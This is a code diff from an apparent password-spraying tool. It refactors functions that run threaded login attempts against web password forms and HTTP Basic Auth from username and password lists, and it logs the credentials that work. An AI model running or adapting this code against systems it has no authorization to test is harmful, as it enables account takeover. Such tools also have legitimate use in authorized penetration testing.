@@ -500,14 +500,14 @@ def basic_auth_spray(full_url, password, username, session, successful_cracks, f
         response = session.get(full_url, auth=HTTPBasicAuth(username, password))
         total_attempts += 1  # Increment total attempts
         if response.status_code == 200:
-            print(f"{Fore.GREEN}Success! BasicAuth credentials: Username: {username}, Password: {password} on {full_url}")
+            print(f"{Fore.GREEN}]\nSuccess! BasicAuth credentials: Username: {username}, Password: {password} on {full_url}")
             successful_cracks.append((full_url, username, password))
             successful_attempts += 1  # Increment successful attempts
             return
         else:
             failed_cracks.append((full_url, username, password))
     except (Timeout, ConnectionError):
-        print(f"Connection failed for {full_url}")
+        print(f"\nConnection failed for {full_url}")
         time.sleep(1)
     except RequestException as e:
         print(f"An error occurred: {e}")
@@ -532,47 +532,48 @@ def password_field_spray(full_url, password, username, session, successful_crack
         print(f"An error occurred: {e}")
 
 
-def single_spray(full_url, passwords, usernames, session, successful_cracks, failed_cracks, total_attempts, successful_attempts, total_pages_field):
-    # Check if the page has a password field (form-based authentication)
-        if is_password_requested_basic_password_field(full_url, session):
-            #Bar usage from https://stackoverflow.com/questions/3002085/how-to-print-out-status-bar-and-percentage
-            bar = progressbar.ProgressBar(maxval=(len(passwords)*len(usernames)), \
-            widgets=[progressbar.Bar('=', '[', ']'), ' ', progressbar.Percentage()])
-            bar.start()
-            count = 0
-            total_pages_field +=1
-            for password in passwords:
-                threads = []
-                for username in usernames:
-                    count +=1
-                    bar.update(count)
-                    tsub = Thread(target=password_field_spray, args=(full_url, password, username, session, successful_cracks, failed_cracks))
-                    threads.append(tsub)    
-                for thread in threads:
-                    thread.start()
-                for thread in threads:   
-                    thread.join()
-            bar.finish()
+def single_spray(full_url, passwords, usernames, session, successful_cracks, failed_cracks):
+    global total_pages_field, total_attempts, successful_attempts
+# Check if the page has a password field (form-based authentication)
+    if is_password_requested_basic_password_field(full_url, session):
+        #Bar usage from https://stackoverflow.com/questions/3002085/how-to-print-out-status-bar-and-percentage
+        bar = progressbar.ProgressBar(maxval=(len(passwords)*len(usernames)),
+        widgets=[progressbar.Bar('=', '[', ']'), ' ', progressbar.Percentage()])
+        bar.start()
+        count = 0
+        total_pages_field +=1
+        for password in passwords:
+            threads = []
+            for username in usernames:
+                count +=1
+                bar.update(count)
+                tsub = Thread(target=password_field_spray, args=(full_url, password, username, session, successful_cracks, failed_cracks))
+                threads.append(tsub)    
+            for thread in threads:
+                thread.start()
+            for thread in threads:   
+                thread.join()
+        bar.finish()
 
-        if is_password_requested_basic_auth(full_url, session):
-            #Bar usage from https://stackoverflow.com/questions/3002085/how-to-print-out-status-bar-and-percentage
-            bar = progressbar.ProgressBar(maxval=(len(passwords)*len(usernames)), \
-            widgets=[progressbar.Bar('=', '[', ']'), ' ', progressbar.Percentage()])
-            bar.start()
-            count = 0
-            total_pages_field +=1
-            for password in passwords:
-                threads = []
-                for username in usernames:
-                    count +=1
-                    bar.update(count)
-                    tsub = Thread(target=basic_auth_spray, args=(full_url, password, username, session, successful_cracks, failed_cracks))
-                    threads.append(tsub)    
-                for thread in threads:
-                    thread.start()
-                for thread in threads:   
-                    thread.join()
-            bar.finish()
+    if is_password_requested_basic_auth(full_url, session):
+        #Bar usage from https://stackoverflow.com/questions/3002085/how-to-print-out-status-bar-and-percentage
+        bar = progressbar.ProgressBar(maxval=(len(passwords)*len(usernames)),
+        widgets=[progressbar.Bar('=', '[', ']'), ' ', progressbar.Percentage()])
+        bar.start()
+        count = 0
+        total_pages_field +=1
+        for password in passwords:
+            threads = []
+            for username in usernames:
+                count +=1
+                bar.update(count)
+                tsub = Thread(target=basic_auth_spray, args=(full_url, password, username, session, successful_cracks, failed_cracks))
+                threads.append(tsub)    
+            for thread in threads:
+                thread.start()
+            for thread in threads:   
+                thread.join()
+        bar.finish()
 
 
 
@@ -623,7 +624,7 @@ def password_spraying(ip_address, username_file, password_file, criteria):
         log_resource_usage("Login at page", full_url)
         
         # Check if the page has authentication fields and update the total pages checked
-        single_spray(full_url, passwords, usernames, session, successful_cracks, failed_cracks, total_attempts, successful_attempts, total_pages_field)
+        single_spray(full_url, passwords, usernames, session, successful_cracks, failed_cracks)
 
     duration = end_timer()  
 
